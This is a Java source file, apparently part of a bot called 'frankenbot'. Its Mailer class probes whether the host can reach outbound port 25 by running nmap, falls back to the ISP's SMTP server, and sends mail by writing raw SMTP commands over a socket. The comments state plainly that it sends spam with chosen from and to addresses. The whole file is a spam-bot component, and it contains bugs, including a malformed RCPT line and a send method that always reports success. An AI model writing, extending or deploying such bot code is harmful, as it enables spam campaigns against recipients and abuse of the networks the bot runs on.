package ca.franky.frankenbot_bot;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.Socket;
import java.text.DateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * A class that helps the bot determine whether or not it can send outbound
 * mail. The class also has a method to send an actual email
 * @author fbegin1
 */
public class Mailer {
    String mode;
    String smtpServer;


    public Mailer (Bot myBot) {
        if (Mailer.checkOutboundSMTP("gmail-smtp-in.l.google.com")) {
            mode = "self";
            smtpServer = myBot.hostNetParams.hostFQDN;
        } else {
            myBot.hostNetParams.findDNSdata(myBot.publicIP);
            String hostSMTPServer = myBot.hostNetParams.findSMTPserver(myBot
                    .hostNetParams.hostDomainName);
            if (hostSMTPServer != null) {
                if (Mailer.checkOutboundSMTP(hostSMTPServer)) {
                    mode = "isp";
                    smtpServer = null;
                } else {
                    mode = "filtered";
                    hostSMTPServer = null;
                }
            } else {
                mode = "filtered";
                hostSMTPServer = null;
            }
        }
    }

    /** Method to send SMTP message via open SMTP relay server bt
     * communicating directly with the SMTP server via a socket. Code adapter
     * from http://www.developerfusion
     * .com/code/1975/sending-email-using-smtp-and-java/
     * @param m_sHostName The SMTP server we are using to send spam
     * @param m_iPort The port on which we are connecting and sending spam
     * @param subject The subject of the spam we are sending
     * @param fromAddress The from address of the spam message
     * @param toAddress The to address of the spam message
     * @param body The body of the spam message
     * @return
     */
    @SuppressWarnings("deprecation")
    public static Boolean sendMsg (String smtpServer, int port,
                                   String subject, String fromAddress,
                                   String toAddress, String body) {

        Socket smtpSocket = null;
        DataOutputStream os = null;
        DataInputStream is = null;

        Date dDate = new Date();
        DateFormat dFormat = DateFormat.getDateInstance(DateFormat.FULL,
                Locale.US);

        try {
            smtpSocket = new Socket(smtpServer, port);
            os = new DataOutputStream(smtpSocket.getOutputStream());
            is = new DataInputStream(smtpSocket.getInputStream());

            if (smtpSocket != null && os != null && is != null) {
                try {
                    os.writeBytes("HELO address.com\r\n");
                    os.writeBytes("MAIL From: <" + fromAddress + ">\r\n");
                    os.writeBytes("RCPT To: " + toAddress + ">\r\n");
                    os.writeBytes("DATA\r\n");
                    os.writeBytes("X-Mailer: Via Java\r\n");
                    os.writeBytes("Content-Type: text/html\r\n");
                    os.writeBytes("DATE: " + dFormat.format(dDate) + "\r\n");
                    os.writeBytes("From: Me <" + fromAddress + ">\r\n");
                    os.writeBytes("To: YOU <" + toAddress + ">\r\n");
                    os.writeBytes("Subject: " + subject + "\r\n");
                    os.writeBytes(body + "\r\n");
                    os.writeBytes("\r\n.\r\n");
                    os.writeBytes("QUIT\r\n");

                    // Now send the email off and check the server reply
                    // Was an OK is reached you are compelte
                    String responseline;
                    while ((responseline = is.readLine()) != null) {
                        if (responseline.indexOf("Ok") != -1)
                            break;
                    }
                } catch (Exception e) {
                    System.out.println("Cannot send email as an error " +
                            "occurred.");
                }
            }
        } catch (Exception e) {
            System.out.println("Host " + smtpServer + "unknown");
        }

        return true;
    }

    /**
     * A method that checks whether or not this host can send mail out
     * (port 25 is not blocked by the ISP). The SMTP server we test is hard
     * coded to simplify our code
     * @return
     */
    private static Boolean checkOutboundSMTP (String smtpServer) {
        if (Tools.runCmd("nmap -PN " + smtpServer + "-p 25").contains
                ("25/tcp open  smtp")) {
            return true;
        } else {
            return false;
        }
    }
}
